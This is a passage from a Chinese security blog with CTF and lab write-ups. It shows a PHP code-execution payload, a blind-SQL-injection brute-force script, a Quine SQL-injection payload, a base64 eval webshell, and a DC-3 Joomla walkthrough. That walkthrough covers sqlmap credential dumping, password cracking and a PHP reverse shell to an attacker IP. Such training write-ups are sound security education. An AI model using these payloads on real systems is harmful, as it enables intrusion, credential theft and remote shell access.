<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); </span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5B%E9%B9%8F%E5%9F%8E%E6%9D%AF%202022%5D%E7%AE%80%E5%8D%95%E7%9A%84php%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>成功拿到flag。</p>
<h2 id="NISACTF-2022-hardsql"><a href="#NISACTF-2022-hardsql" class="headerlink" title="[NISACTF 2022]hardsql"></a>[NISACTF 2022]hardsql</h2><p>这道题其实就是Quine注入，关于payload的构造，参考这位大神的文章：</p>
<p>[(7条消息) Quine-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_74426248/article/details/131897797?spm=1001.2014.3001.5502">第五空间 2021]yet_another_mysql_injection_qq_74426248的博客-CSDN博客</a></p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dhardsql%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目一进去是一个登录界面，hint里面有用户，但我们需要爆破出密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://1.14.71.254:28279/login.php&#x27;</span><br><span class="line">dict = &#x27;0123456789qwertyuiopasdfghjklzxcvbnm-&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for j in range(50):</span><br><span class="line">    for i in dict:</span><br><span class="line">        data=&#123;</span><br><span class="line">            &quot;username&quot;:&quot;bilala&quot;,</span><br><span class="line">            &quot;passwd&quot;:f&quot;1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;flag+i&#125;%&#x27;#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,data=data)</span><br><span class="line">        if &quot;nothing found&quot; not in res.text:</span><br><span class="line">            flag=flag+i</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>爆破出密码为b2f2d15b3ae082ca29697d8dcd420fd7，我们进行登录，得到了源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//多加了亿点点过滤</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;waf here&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;bilala&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only bilala can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$MysqlLink</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;nothing found&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点是这一段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ($row[&#x27;passwd&#x27;] === $password) &#123;</span><br><span class="line">        if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123;</span><br><span class="line">            show_source(__FILE__);</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die($FLAG);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>数据库中的passwd和输入的password一样，然后 password不等于b2f2d15b3ae082ca29697d8dcd420fd7才可以 die flag</p>
<p>这里拿到flag的条件就是密码不为b2f2d15b3ae082ca29697d8dcd420fd7且能登陆成功</p>
<p>题中还过滤了char，用chr或者直接0x代替即可。</p>
<p>0x、char、chr三个等价  </p>
<p>0x22,  双引号   char (34)     &#x3D;&#x3D;</p>
<p>0x27   单引号   char (39)    </p>
<p>相信有人纳闷，这道题为什么是%而不是.  因为 0x25是%的16进制改为</p>
<p>0x2e . 也是可以的<br>所以构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#&amp;login=%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNISACTF%202022%5Dhardsql%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<h2 id="GKCTF-2020-CheckIN"><a href="#GKCTF-2020-CheckIN" class="headerlink" title="[GKCTF 2020]CheckIN"></a>[GKCTF 2020]CheckIN</h2><p>先看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure>

<p>可以看到我们传入的东西是会被base64解码一遍的，所以我们先尝试传参phpinfo();</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>成功执行了phpinfo()，但是我们发现有被禁用的太多了</p>
<p>那我们尝试进行上传一句话木马</p>
<p>eval($_POST[a]);编码之后是ZXZhbCgkX1BPU1RbYV0pOw&#x3D;&#x3D;</p>
<p>传参之后用蚁剑进行连接，连接成功之后进入查找</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>在根目录下发现了flag打开是空的，那我们看看readflag吧</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>无法读取，但我们猜想是通过readflag来读取flag文件</p>
<p>上网看看，通过phpinfo()知道php版本为7.3，这个版本有一个漏洞<br>php7-gc-bypass漏洞利用PHP garbage collector程序中的堆溢出触发进而执行命令<br>影响范围是linux，php7.0-7.3<br>给出了exp<br><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>下载后进行修改，改为执行readflag</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>现在攻击文件准备好了，该上传到哪里呢：</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<p>我们发现tmp文件夹的权限是777，什么都可以做，就把攻击的php上传到那里去吧</p>
<p>然后通过之前上传的一句话来包含攻击文件</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGKCTF%202020%5DCheckIN%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png" class>

<p>成功拿到flag。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DC3-4靶机复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-08-02 18:28:05 / 修改时间：18:29:03" itemprop="dateCreated datePublished" datetime="2023-08-02T18:28:05+08:00">2023-08-02</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>9 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="DC3-4靶机复现"><a href="#DC3-4靶机复现" class="headerlink" title="DC3-4靶机复现"></a>DC3-4靶机复现</h1><h2 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h2><h3 id="基础信息搜集"><a href="#基础信息搜集" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h3><p>老样子，上来还是基础流程，根据我们找到的mac地址，确定靶机地址</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png" class>

<p>使用nmap查看目标靶机的详细端口开放</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.138</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>

<p>可以看到只开放了80端口提供http页面，同时使用的是apache服务器，版本为2.4.18</p>
<p>访问一下页面</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>

<p>搜集到如下信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Joomla		cms管理系统</span><br><span class="line">Ubuntu		操作系统</span><br><span class="line">Apache		服务器2.4.18</span><br></pre></td></tr></table></figure>

<p>页面上还有这么一句话：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DC-3.</span><br><span class="line">欢迎来到DC-3。</span><br><span class="line">This time, there is only one flag, one entry point and no clues.</span><br><span class="line">这一次，只有一个flag，一个入口点，没有任何线索。</span><br><span class="line">To get the flag, you&#x27;ll obviously have to gain root privileges.</span><br><span class="line">要获得flag，您显然必须获得root权限。</span><br><span class="line">How you get to be root is up to you - and, obviously, the system.</span><br><span class="line">你如何成为root取决于你 - 显然，还有系统。</span><br><span class="line">Good luck - and I hope you enjoy this little challenge.  :-)</span><br></pre></td></tr></table></figure>

<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>既然有cms，我们首先使用metasploit对于cms进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>

<p>发现有很多攻击模块，试试，发现没有一个成功的，这很恼火，那么我们使用dirb扫一下目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.10.138</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>

<p>挨着访问，我们发现了一个后台登录界面</p>
<p><a target="_blank" rel="noopener" href="http://192.168.10.138/administrator/index.php">http://192.168.10.138/administrator/index.php</a></p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36-16908701995612.png" class>

<p>到这里不知道该怎么办，知道是cms</p>
<p>但是我们这时候就有反骨了，突然想起来之前安装的advs这个漏洞扫描器还没用过，那就试试，设置好后，开始扫描</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png" class>

<p>哇塞，全是漏洞（好富裕，一时间不知道该利用哪个），我们先从第一个开始看（点进去之后有漏洞描述）</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>

<p>明显是一个sql注入漏洞，原理是没有对用户提供的数据进行充分处理</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据advs提供的漏洞讲解文章还有网上搜到的，我们得到如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>

<p>经检验，漏洞确实存在，那接下来就到我们的懒狗快乐时间（使用sqlmap）</p>
<p>爆库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; --dbs</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>

<p>爆出来5个库，既然是joomla的cms，那我们就先看joomladb这个表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D &quot;joomladb&quot; --tables</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>

<p>爆出来76个表，既然我们想要弄到后台的信息，那我们就先看看users这个表，查列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>

<p>得到了6个字段的东西，下一步肯定首先就是查id和password的东西了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>

<p>这密码一看就是加密过的，看起来很像md5解密，我们解密一手，但是这个使用md5在线工具解密失败了，所以我们上网搜了一下，尝试使用kali自带的john进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim 1.txt</span><br><span class="line">将密码复制进去</span><br><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>

<p>得到密码，进行登录</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>

<p>好，到这里已经是极限了，下面我是真不会了，只有乱测，乱点一通，但是没发现啥有用的，撑不下去了，还是乖乖的看wp吧</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>发现Extensions-&gt;Templates里面的模板可以修改执行PHP脚本</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>

<p>那我们接下来就随便找一个路径书写我们想要的php程序</p>
<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>

<p>往里面书写我们想要进行反弹shell的代码（一定要注意缩进）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$sock = fsockopen(&quot;192.168.79.128&quot;, &quot;5555&quot;);</span><br><span class="line"></span><br><span class="line">$descriptorspec = array(</span><br><span class="line"></span><br><span class="line">			0 =&gt; $sock,</span><br><span class="line"></span><br><span class="line">			1 =&gt; $sock,</span><br><span class="line"></span><br><span class="line">			2 =&gt; $sock</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open(&#x27;/bin/sh&#x27;, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>

<p>点击save保存之后进行访问<a target="_blank" rel="noopener" href="http://192.168.10.138/offline.php">http://192.168.10.138/offline.php</a></p>
<p>在kali内对4441端口进行监听：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4441</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png" class>

<p>可以看到已经接收到shell</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>拿到shell之后，进行了一些基础操作，包括通过python更改交互式shell，但显示权限不够，然后使用suid提权，发现也不行，这里就尝试进行系统漏洞提权</p>
<p>查看发行版的详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*release       #查看发行版信息</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>

<p>可以看到是ubuntu的16.04的版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version  #查看内核版本的全部信息</span><br></pre></td></tr></table></figure>

